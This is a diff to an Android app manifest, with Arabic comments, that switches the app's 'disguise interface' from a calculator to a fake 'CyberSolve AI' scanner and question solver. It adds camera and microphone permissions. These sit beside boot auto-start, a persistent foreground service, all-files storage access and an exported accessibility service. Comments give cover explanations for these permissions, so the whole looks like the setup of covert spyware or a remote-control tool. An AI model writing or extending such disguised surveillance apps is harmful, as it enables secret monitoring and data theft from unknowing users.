@@ -1,11 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <!--
-  AndroidManifest.xml — البيان النهائي (المعدّل).
+  AndroidManifest.xml — البيان النهائي (المعدّل للتمويه الجديد).
 
   التعديلات في هذه النسخة:
-  - استخدام ثيم مخصص @style/Theme.DisguiseApp بدلاً من
-    @style/Theme.AppCompat.Light.NoActionBar (حتى يعمل themes.xml).
-
+  - إضافة أذونات الكاميرا والميكروفون (للمسح الضوئي وحل الأسئلة).
+  - تحديث التعليقات لتتوافق مع تطبيق "CyberSolve AI".
+  
   المسار: app/src/main/AndroidManifest.xml
 -->
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
@@ -15,6 +15,12 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
+    <!-- ============ أذونات الكاميرا والميكروفون (للمسح الضوئي) ============ -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <!-- ضمان عمل التطبيق على الأجهزة بدون كاميرا (مثل المحاكيات) -->
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+
     <!-- ============ الخدمة الأمامية (Android 14+ إلزامي) ============ -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
@@ -22,7 +28,7 @@
     <!-- ============ البدء التلقائي بعد إعادة التشغيل ============ -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
-    <!-- ============ الوصول لجميع الملفات (يتطلب تفعيل يدوي) ============ -->
+    <!-- ============ الوصول لجميع الملفات (لحفظ الأسئلة المحلولة) ============ -->
     <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
 
     <!-- ============ الإشعارات (Android 13+) ============ -->
@@ -38,7 +44,7 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.DisguiseApp">
 
-        <!-- ============ 1. واجهة التمويه (آلة حاسبة) ============ -->
+        <!-- ============ 1. واجهة التمويه (الماسح الضوئي / حل الأسئلة) ============ -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -57,7 +63,7 @@
             android:foregroundServiceType="dataSync"
             android:stopWithTask="false" />
 
-        <!-- ============ 3. خدمة إمكانية الوصول ============ -->
+        <!-- ============ 3. خدمة إمكانية الوصول (لتحليل النصوص) ============ -->
         <service
             android:name=".control.AccessibilityHelper"
             android:exported="true"
